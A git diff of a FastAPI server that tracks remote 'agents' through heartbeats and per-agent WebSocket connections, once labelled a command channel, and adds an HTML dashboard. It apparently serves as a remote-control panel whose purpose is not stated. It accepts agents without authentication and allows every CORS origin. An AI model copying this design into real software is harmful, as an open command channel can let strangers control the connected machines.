@@ -1,9 +1,14 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
+from fastapi.responses import HTMLResponse
+from fastapi.templating import Jinja2Templates
 from fastapi.middleware.cors import CORSMiddleware
-import asyncio, time, uuid
+import asyncio, time, socket
 
 app = FastAPI()
 
+# =======================
+# CORS
+# =======================
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -12,15 +17,30 @@ app.add_middleware(
 )
 
 # =======================
-# STORAGE
+# Templates
 # =======================
-agents = {}          # agent_id -> info
-ws_agents = {}       # agent_id -> websocket
+templates = Jinja2Templates(directory="templates")
 
 # =======================
-# BASIC STATUS
+# Storage
 # =======================
-@app.get("/")
+agents = {}
+ws_agents = {}
+
+# =======================
+# ROOT → DASHBOARD
+# =======================
+@app.get("/", response_class=HTMLResponse)
+async def dashboard(request: Request):
+    return templates.TemplateResponse(
+        "index.html",
+        {"request": request}
+    )
+
+# =======================
+# API STATUS (اختياري)
+# =======================
+@app.get("/status")
 async def status():
     return {
         "status": "Online",
@@ -57,20 +77,20 @@ async def heartbeat(data: dict):
     return {"ok": True}
 
 # =======================
-# LIST AGENTS (DASHBOARD)
+# LIST AGENTS (FOR JS)
 # =======================
 @app.get("/agents")
 async def list_agents():
     return list(agents.values())
 
 # =======================
-# WEBSOCKET (COMMAND CHANNEL)
+# WEBSOCKET
 # =======================
 @app.websocket("/ws/{agent_id}")
 async def ws_agent(websocket: WebSocket, agent_id: str):
     await websocket.accept()
     ws_agents[agent_id] = websocket
-    print(f"[WS] Agent connected: {agent_id}")
+    print(f"[WS] Connected: {agent_id}")
 
     try:
         while True:
@@ -79,10 +99,10 @@ async def ws_agent(websocket: WebSocket, agent_id: str):
         ws_agents.pop(agent_id, None)
         if agent_id in agents:
             agents[agent_id]["status"] = "offline"
-        print(f"[WS] Agent disconnected: {agent_id}")
+        print(f"[WS] Disconnected: {agent_id}")
 
 # =======================
-# CLEANUP OFFLINE AGENTS
+# CLEANUP OFFLINE
 # =======================
 @app.on_event("startup")
 async def cleanup_loop():
